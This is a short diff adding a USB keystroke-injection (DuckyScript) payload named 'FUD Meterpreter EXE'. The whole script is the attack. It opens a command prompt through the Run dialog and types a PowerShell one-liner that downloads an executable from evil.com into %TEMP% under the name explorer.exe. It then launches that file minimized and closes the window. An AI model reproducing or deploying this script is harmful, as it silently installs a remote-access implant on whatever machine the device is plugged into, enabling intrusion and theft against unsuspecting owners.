@@ -1,0 +1,14 @@
+REM FUD Meterpreter EXE
+DELAY 1500
+GUI r
+DELAY 300
+STRING cmd
+DELAY 300
+ENTER
+DELAY 1000
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://www.evil.com/3m72nJAv9hdN7l6H/explorer.exe?id=10','%TEMP%\explorer.exe'); Start-Process "%TEMP%\explorer.exe" -WindowStyle Minimized
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+ENTER
